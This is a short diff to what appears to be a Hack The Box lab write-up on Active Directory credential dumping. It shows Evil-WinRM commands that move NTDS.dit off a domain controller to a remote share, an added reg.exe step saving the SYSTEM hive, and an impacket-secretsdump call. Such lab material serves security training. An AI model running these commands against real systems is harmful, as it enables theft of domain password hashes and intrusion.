@@ -1050,7 +1050,8 @@ Successfully created shadow copy for 'C:\'
 ```
 *Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
 
-        1 file(s) moved.		
+        1 file(s) moved.
+*Evil-WinRM* PS C:\NTDS> reg.exe save hklm\system C:\system.save	
 ```
 ```
 [/htb]$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
